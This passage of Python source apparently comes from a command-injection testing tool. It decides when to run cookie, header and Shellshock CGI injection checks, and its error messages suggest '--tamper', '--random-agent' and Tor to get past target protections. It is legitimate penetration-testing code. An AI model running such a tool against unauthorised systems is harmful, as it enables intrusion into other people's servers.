    if settings.TESTABLE_PARAMETERS_LIST or \
       not settings.INJECTION_MARKER_LOCATION.URL or \
       not settings.INJECTION_MARKER_LOCATION.DATA:
      data_checks(url, http_request_method, filename, timesec)

    if proceed_non_custom:
      # Determine if we should perform cookie-based injection checks.
      cookie_check = (settings.TESTABLE_PARAMETERS_LIST or \
                      not settings.INJECTION_MARKER_LOCATION.COOKIE) and \
                      settings.INJECTION_LEVEL >= settings.COOKIE_INJECTION_LEVEL
      if cookie_check:
        settings.COOKIE_INJECTION = True
        cookies_checks(url, http_request_method, filename, timesec)

      # Prepare headers list to evaluate whether header injection should be attempted.
      testable = settings.TESTABLE_PARAMETERS_LIST
      if isinstance(testable, str):
        testable = [testable]
        
      testable_lower = [t.lower() for t in testable if isinstance(t, str)]

      header_flags = [
        settings.USER_AGENT,
        settings.REFERER,
        settings.HOST
      ]

      # Check if any header flag is within the testable parameters list.
      header_found = any(isinstance(h, str) and \
                         h.lower() in testable_lower for h in header_flags)

      # Decide if header-based injection should be tested.
      header_check = (settings.TESTABLE_PARAMETERS_LIST or \
                      not settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS) and \
                      settings.INJECTION_LEVEL == settings.HTTP_HEADER_INJECTION_LEVEL or header_found

      if header_check:
        # Perform custom headers injection checks.
        settings.CUSTOM_HEADER_INJECTION = True
        custom_headers_checks(url, http_request_method, filename, timesec)

        settings.HTTP_HEADERS_INJECTION = True
        headers_checks(url, http_request_method, filename, timesec)

  # Return True if injection checks are active/enabled, False otherwise.
  return settings.INJECTION_CHECKER is not False


"""
General check on every injection technique.
"""
def do_check(url, http_request_method, filename):
  try:
    if settings.RECHECK_FILE_FOR_EXTRACTION:
      settings.RECHECK_FILE_FOR_EXTRACTION = False

    # Check for '--tor' option.
    if menu.options.tor:
      if not menu.options.tech or "t" in menu.options.tech or "f" in menu.options.tech:
        warn_msg = "It is highly recommended to avoid usage of switch '--tor' for "
        warn_msg += "time-based injections because of inherent high latency time."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

    # Check target URL for CGI scripts vulnerable to Shellshock.
    checks.check_CGI_scripts(url)
    perform_checks(url, http_request_method, filename)
      
    # All injection techniques seems to be failed!
    if not settings.INJECTION_CHECKER and not settings.LOAD_SESSION:
      if settings.NOT_TESTABLE_PARAMETERS:
        err_msg = "All testable parameters you provided are not present within the given request data."
      else:
        err_msg = "All tested parameters do not appear to be injectable."
        if settings.INJECTION_LEVEL < settings.HTTP_HEADER_INJECTION_LEVEL :
          err_msg += " Try to increase value for '--level' option"
          err_msg += " if you wish to perform more tests."
        if settings.USER_APPLIED_TECHNIQUE or settings.SKIP_TECHNIQUES:
          err_msg += " You can try to rerun without providing the option "
          if not settings.SKIP_TECHNIQUES :
            err_msg += "'--technique'."
          else:
            err_msg += "'--skip-technique'."
        err_msg += " If you suspect that there is some kind of protection mechanism involved, maybe you could try to"
        if not menu.options.tamper:
          err_msg += " use option '--tamper'"
        if not menu.options.random_agent:
          if not menu.options.tamper:
            err_msg += " and/or"
          err_msg += " switch '--random-agent'"
        err_msg += "."
        if settings.MULTI_TARGETS:
          err_msg += " Skipping to the next target."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    else:
      logs.print_logs_notification(filename, url)
    if not settings.MULTI_TARGETS:
      common.show_http_error_codes()
      raise SystemExit()

  except KeyboardInterrupt:
    checks.user_aborted(filename, url)

# eof